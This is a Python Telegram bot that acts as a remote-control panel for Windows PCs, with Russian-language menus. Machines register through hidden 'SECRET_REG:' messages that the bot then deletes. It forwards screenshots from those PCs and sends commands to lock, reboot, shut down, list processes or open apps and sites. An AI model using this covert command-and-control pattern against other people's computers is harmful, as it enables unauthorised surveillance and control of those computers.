import asyncio
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 123456789  # УКАЖИТЕ СВОЙ ID ЦИФРАМИ

bot = Bot(token=TOKEN)
dp = Dispatcher()

connected_pcs = {}

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not is_admin(message.from_user.id): return
    await message.answer("🤖 Пульт администратора Windows готов.\n\n/devices — Открыть список устройств")

@dp.message(F.text.startswith("SECRET_REG:"))
async def register_via_tg(message: types.Message):
    try: await message.delete()
    except: pass
    try:
        _, device_id, pc_name = message.text.split(":")
        connected_pcs[device_id] = {"name": pc_name, "last_seen": asyncio.get_event_loop().time()}
        print(f"[СЕРВЕР] ПК {pc_name} онлайн.")
    except Exception as e:
        print(f"Ошибка регистрации: {e}")

@dp.message(F.document & F.caption.startswith("SCREEN_REPLY:"))
async def receive_screenshot(message: types.Message):
    if not is_admin(message.from_user.id):
        device_id = message.caption.split(":")[1]
        pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
        file_id = message.document.file_id
        file = await bot.get_file(file_id)
        file_buffer = await bot.download_file(file.file_path)
        input_file = BufferedInputFile(file_buffer.read(), filename="screenshot.png")
        await bot.send_photo(chat_id=ADMIN_ID, photo=input_file, caption=f"📸 Скриншот с ПК: {pc_name}")
        try: await message.delete()
        except: pass

@dp.message(Command("devices"))
async def cmd_devices(message: types.Message):
    if not is_admin(message.from_user.id): return
    if not connected_pcs:
        await message.answer("❌ Список устройств пуст.")
        return
    keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
    await message.answer("🎛 Выберите устройство для управления:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

# Главное меню управления устройством (Категории функций)
@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = connected_pcs.get(device_id)
    if not device_info:
        await callback.answer("❌ Устройство оффлайн.")
        return
        
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг (1-3)", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия (4-7)", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов (8-11)", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения (12-15)", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад к списку", callback_data="back_to_list")]
    ])
    await callback.message.edit_text(text=f"💻 Управление ПК: *{device_info['name']}*", parse_mode="Markdown", reply_markup=keyboard)

# Категория 1: Мониторинг
@dp.callback_query(F.data.startswith("cat_mon_"))
async def cat_monitoring(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1. 📸 Сделать скриншот", callback_data=f"cmd_screen_{dev_id}")],
        [InlineKeyboardButton(text="2. 📋 Список процессов", callback_data=f"cmd_tasklist_{dev_id}")],
        [InlineKeyboardButton(text="3. 🔊 Звук на максимум", callback_data=f"cmd_volmax_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="📊 **Инфо и Мониторинг**", parse_mode="Markdown", reply_markup=keyboard)

# Категория 2: Системные действия
@dp.callback_query(F.data.startswith("cat_sys_"))
async def cat_system(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="4. 🔒 Заблокировать экран", callback_data=f"cmd_lock_{dev_id}")],
        [InlineKeyboardButton(text="5. 🌙 В спящий режим", callback_data=f"cmd_sleep_{dev_id}")],
        [InlineKeyboardButton(text="6. 🔄 Перезагрузить ПК", callback_data=f"cmd_reboot_{dev_id}")],
        [InlineKeyboardButton(text="7. 🛑 Выключить ПК", callback_data=f"cmd_shutdown_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="⚙️ **Системные действия**", parse_mode="Markdown", reply_markup=keyboard)

# Категория 3: Открытие ресурсов
@dp.callback_query(F.data.startswith("cat_web_"))
async def cat_web(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="8. 🌐 Открыть YouTube", callback_data=f"cmd_yt_{dev_id}")],
        [InlineKeyboardButton(text="9. 🔍 Открыть Google", callback_data=f"cmd_google_{dev_id}")],
        [InlineKeyboardButton(text="10. 🗺 Открыть Карты", callback_data=f"cmd_maps_{dev_id}")],
        [InlineKeyboardButton(text="11. 💬 Вывести Окно-Сообщение", callback_data=f"cmd_msg_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="🌐 **Открытие ресурсов и медиа**", parse_mode="Markdown", reply_markup=keyboard)

# Категория 4: Утилиты
@dp.callback_query(F.data.startswith("cat_util_"))
async def cat_utilities(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="12. 🧮 Запустить Калькулятор", callback_data=f"cmd_calc_{dev_id}")],
        [InlineKeyboardButton(text="13. 📝 Запустить Блокнот", callback_data=f"cmd_notepad_{dev_id}")],
        [InlineKeyboardButton(text="14. 🎨 Запустить Paint", callback_data=f"cmd_paint_{dev_id}")],
        [InlineKeyboardButton(text="15. ⏳ Запустить Хранитель экрана", callback_data=f"cmd_scr_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="🛠 **Запуск встроенных утилит**", parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    _, cmd_type, device_id = callback.data.split("_", 2)
    await bot.send_message(chat_id=ADMIN_ID, text=f"CMD:{device_id}:{cmd_type}")
    await callback.answer("🚀 Команда отправлена на исполнение")

@dp.callback_query(F.data == "back_to_list")
async def back_to_list(callback: types.CallbackQuery):
    await callback.message.delete()
    await cmd_devices(callback.message)

if __name__ == "__main__":
    asyncio.run(dp.start_polling(bot))
